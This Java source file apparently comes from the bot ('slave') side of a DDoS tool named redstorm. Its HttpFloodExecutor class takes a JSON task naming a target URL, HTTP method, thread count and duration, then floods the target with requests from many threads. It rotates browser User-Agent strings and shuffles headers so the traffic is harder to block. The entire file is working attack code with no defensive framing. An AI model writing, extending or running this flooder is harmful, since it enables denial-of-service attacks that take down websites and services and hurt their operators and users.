package dev.mrflyn.redstorm_slave;

import okhttp3.*;
import com.google.gson.*;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.*;

public class HttpFloodExecutor {
    private static final OkHttpClient client = new OkHttpClient();
    private static final List<String> USER_AGENTS = Arrays.asList(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
    );
    private static final Random RANDOM = new Random();

    public static void executeHttpFlood(String taskJson) {
        JsonObject task = JsonParser.parseString(taskJson).getAsJsonObject();
        String targetUrl = task.get("target").getAsString();
        String method = task.get("method").getAsString().toUpperCase();
        int numThreads = task.get("threads").getAsInt();
        int durationSec = task.get("duration").getAsInt();

        JsonObject headersJson = task.has("headers") ? task.getAsJsonObject("headers") : new JsonObject();
        String body = task.has("body") ? task.get("body").getAsString() : null;

        System.out.println("Starting " + method + " attack on: " + targetUrl + " with " + numThreads + " threads for " + durationSec + " seconds");

        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        long endTime = System.currentTimeMillis() + (durationSec * 1000);

        for (int i = 0; i < numThreads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime) {
                    sendHttpRequest(targetUrl, method, headersJson, body);
                }
            });
        }

        executor.shutdown();
        try {
            executor.awaitTermination(durationSec + 5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            System.err.println("Execution interrupted");
        }

        System.out.println("Attack completed.");
    }

    private static void sendHttpRequest(String url, String method, JsonObject headersJson, String body) {
        Request.Builder requestBuilder = new Request.Builder().url(url);

        // Add randomized headers
        Map<String, String> headersMap = new HashMap<>();
        headersJson.entrySet().forEach(entry -> headersMap.put(entry.getKey(), entry.getValue().getAsString()));

        // Add a random user-agent
        headersMap.put("User-Agent", USER_AGENTS.get(RANDOM.nextInt(USER_AGENTS.size())));

        // Shuffle headers before adding them
        List<Map.Entry<String, String>> headerList = new ArrayList<>(headersMap.entrySet());
        Collections.shuffle(headerList);
        for (Map.Entry<String, String> entry : headerList) {
            requestBuilder.addHeader(entry.getKey(), entry.getValue());
        }

        // Determine request type
        RequestBody requestBody = (body != null) ? RequestBody.create(body, MediaType.parse("application/json")) : null;
        switch (method) {
            case "POST":
                requestBuilder.post(requestBody != null ? requestBody : RequestBody.create(new byte[0]));
                break;
            case "PUT":
                requestBuilder.put(requestBody != null ? requestBody : RequestBody.create(new byte[0]));
                break;
            case "DELETE":
                requestBuilder.delete(requestBody);
                break;
            default:
                requestBuilder.get();
        }

        try (Response response = client.newCall(requestBuilder.build()).execute()) {
            System.out.println("Response: " + response.code());
        } catch (IOException e) {
            System.err.println("Request failed: " + e.getMessage());
        }
    }
}
